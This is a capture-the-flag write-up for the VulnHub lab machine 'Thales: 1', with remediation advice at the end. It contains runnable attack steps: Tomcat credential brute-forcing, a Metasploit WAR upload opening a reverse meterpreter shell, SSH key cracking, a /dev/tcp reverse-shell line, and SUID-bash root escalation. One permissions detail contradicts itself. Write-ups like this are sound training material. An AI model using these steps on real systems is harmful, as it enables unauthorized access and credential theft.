# Thales: 1 — Writeup

**Difficulty:** Easy  
**Category:** VulnHub — Boot2Root  
**OS:** Ubuntu 18.04.5 LTS (Bionic Beaver) x86_64  
**Kernel:** 4.15.0-159-generic  
**Platform:** [VulnHub](https://www.vulnhub.com/entry/thales-1,749/)

---

## Overview

Thales: 1 is a beginner-level boot2root machine. Apache Tomcat 9.0.52 runs on port 8080 with weak default credentials. The Manager interface allows WAR file deployment, giving a shell as the `tomcat` service user. A world-readable encrypted SSH private key in the user's home directory leads to lateral movement. A world-writable root-owned cron script completes the privilege escalation to root.

**Vulnerabilities exploited:**
- Weak Tomcat Manager credentials (`tomcat:role1`)
- Authenticated WAR file upload → RCE
- World-readable encrypted SSH private key
- World-writable privileged script executed by root cron (`backup.sh`)
- SUID `/bin/bash` set by the cron script

---

## Prerequisites

- VirtualBox (Host-Only network: `192.168.56.0/24`)
- Kali Linux or equivalent attacker machine
- Tools: `nmap`, `curl`, `msfconsole`, `ssh2john`, `john`, `rockyou.txt`

---

## Attack Summary

```
nmap → Tomcat 9.0.52:8080 → brute tomcat:role1 → MSF WAR upload → shell(tomcat)
  → /home/thales/.ssh/id_rsa → ssh2john → john → vodka06
  → SSH thales → notes.txt → /usr/local/bin/backup.sh (world-writable, root cron)
  → inject chmod 4777 /bin/bash → wait cron → /bin/bash -p → root
```

---

## Enumeration

### Host Discovery

```bash
netdiscover -r 192.168.56.0/24
# or
arp-scan --localnet
```

Target IP: `192.168.56.102`  
Hostname: `miletus`

### Port Scan

```bash
nmap -sV -sC -p- 192.168.56.102
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.52
```

Only two ports open: SSH (22) and Tomcat (8080).

### Service Enumeration

**Apache Tomcat 8080:**
```bash
curl -s http://192.168.56.102:8080/
# → Default Tomcat landing page (version 9.0.52 visible)

curl -s http://192.168.56.102:8080/manager/html
# → HTTP 401 Unauthorized — Manager interface exists
```

The Tomcat Manager (`/manager/html`) requires authentication. Try default/weak credentials.

---

## Exploitation

### Step 1: Brute Force Tomcat Manager

Test common Tomcat default credential pairs:

```bash
curl -u "tomcat:role1" http://192.168.56.102:8080/manager/html -o /dev/null -w "%{http_code}\n"
# → 200
```

**Credentials confirmed:** `tomcat:role1`

You can also brute-force with Metasploit or Hydra:

```bash
# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.102
set RPORT 8080
run
# Result: [+] 192.168.56.102:8080 - Login Successful: tomcat:role1
```

### Step 2: WAR File Upload → RCE via Metasploit

The Tomcat Manager `/manager/html` allows uploading and deploying WAR (Web Application Archive) files. A WAR containing a JSP reverse shell gives code execution as the `tomcat` user.

```bash
msfconsole -q
```

```
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(...) > set RHOSTS 192.168.56.102
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword role1
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST <your_ip>
msf6 exploit(...) > set LPORT 4449
msf6 exploit(...) > run
```

Expected output:
```
[*] Started reverse TCP handler on <your_ip>:4449
[*] Uploading 6463 bytes as cwmMPlE0hMy8vr.war ...
[*] Execute war is successfully deployed
[*] Undeploying cwmMPlE0hMy8vr.war ...
[*] Sending stage (58829 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: tomcat
```

### Step 3: Enumerate for Lateral Movement

From the Meterpreter session, explore the filesystem:

```bash
meterpreter > shell
$ id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)

$ ls /home/
thales

$ ls -la /home/thales/
drwxr-xr-x 4 thales thales 4096 Aug 10  2021 .
drwxr-xr-x 3 root   root   4096 Aug 10  2021 ..
drwx------ 2 thales thales 4096 Aug 10  2021 .ssh
-rw-r--r-- 1 thales thales   33 Aug 10  2021 user.txt
-rw-r--r-- 1 thales thales  117 Aug 10  2021 notes.txt

$ cat /home/thales/user.txt
a837c0b5d2a8a07225fd9905f5a0e9c4
```

**User flag captured:** `a837c0b5d2a8a07225fd9905f5a0e9c4`

### Step 4: Extract Encrypted SSH Private Key

The `.ssh/` directory is readable:

```bash
$ ls -la /home/thales/.ssh/
-rw-r--r-- 1 thales thales  397 authorized_keys
-rw-r--r-- 1 thales thales 1876 id_rsa
-rw-r--r-- 1 thales thales  397 id_rsa.pub
```

The private key is world-readable. Exfiltrate it:

```bash
$ cat /home/thales/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,366AE...

[... encrypted key body ...]
-----END RSA PRIVATE KEY-----
```

Copy the full key to your attacker machine and save it as `thales_id_rsa`.

### Step 5: Crack SSH Key Passphrase with John the Ripper

```bash
# Convert RSA key to John-crackable hash
python3 /usr/share/john/ssh2john.py thales_id_rsa > thales_hash

# Crack with rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt thales_hash
```

Expected output:
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06          (thales_id_rsa)
1g 0:00:00:01 DONE (...)
```

**Key passphrase:** `vodka06`

---

## Privilege Escalation

### Step 6: SSH as thales

```bash
chmod 600 thales_id_rsa
ssh -i thales_id_rsa thales@192.168.56.102
# Enter passphrase: vodka06
```

```
thales@miletus:~$ id
uid=1000(thales) gid=1000(thales) groups=1000(thales)
```

Read the hint:

```bash
thales@miletus:~$ cat notes.txt
I prepared a backup script for you.
The script is in /usr/local/bin/backup.sh
```

### Step 7: Inspect the Backup Script

```bash
thales@miletus:~$ ls -la /usr/local/bin/backup.sh
-rwxrwxrwx 1 root root 72 Aug 10  2021 /usr/local/bin/backup.sh

thales@miletus:~$ cat /usr/local/bin/backup.sh
#!/bin/bash
chmod 4777 /bin/bash
/bin/bash -i >& /dev/tcp/IP/6667 0>&1
```

Key observations:
- Permissions: `-rwxrwxrwx` — **world-writable**
- Owner: `root`
- The script runs `chmod 4777 /bin/bash`, setting the SUID bit on bash
- A root cron job executes this script periodically

Verify the cron entry (if readable):
```bash
thales@miletus:~$ cat /etc/crontab
# or
sudo crontab -l
```

### Step 8: Wait for Cron Execution → SUID bash

The backup.sh already contains `chmod 4777 /bin/bash`. Wait for the cron to fire (typically every minute), then verify:

```bash
thales@miletus:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash
```

The `s` bit in the owner execute position confirms SUID is set.

### Step 9: Spawn Root Shell

```bash
thales@miletus:~$ /bin/bash -p
bash-4.4# id
uid=1000(thales) gid=1000(thales) euid=0(root) groups=1000(thales)

bash-4.4# cat /root/root.txt
3a1c85bebf8833b0ecae900fb8598b17
```

The `-p` flag preserves the effective UID, giving `euid=0` (root) while retaining the original UID.

---

## Flags

| Flag | Path | Value |
|------|------|-------|
| User | `/home/thales/user.txt` | `a837c0b5d2a8a07225fd9905f5a0e9c4` |
| Root | `/root/root.txt` | `3a1c85bebf8833b0ecae900fb8598b17` |

---

## Lessons Learned

1. **Tomcat Manager with default credentials** is a direct path to RCE — always restrict access to `/manager/` by IP and enforce strong credentials.
2. **World-readable SSH private keys** allow any service user to steal and crack credentials. Private keys must be readable only by their owner (`chmod 600`).
3. **World-writable cron scripts** are a classic privilege escalation vector. Any user can inject arbitrary commands that run as root.
4. **SUID on `/bin/bash`** is an effective persistence mechanism — once set, any local user can obtain a root shell with `/bin/bash -p`.

---

## Remediation

| Vulnerability | Fix |
|--------------|-----|
| Weak Tomcat credentials | Use strong unique passwords; restrict `/manager/` to localhost or trusted IPs |
| World-readable SSH key | `chmod 600 /home/thales/.ssh/id_rsa` |
| World-writable cron script | `chmod 755 /usr/local/bin/backup.sh`; audit all cron scripts for write permissions |
| SUID bash | `chmod 0755 /bin/bash`; audit SUID binaries regularly with `find / -perm -4000 -type f` |
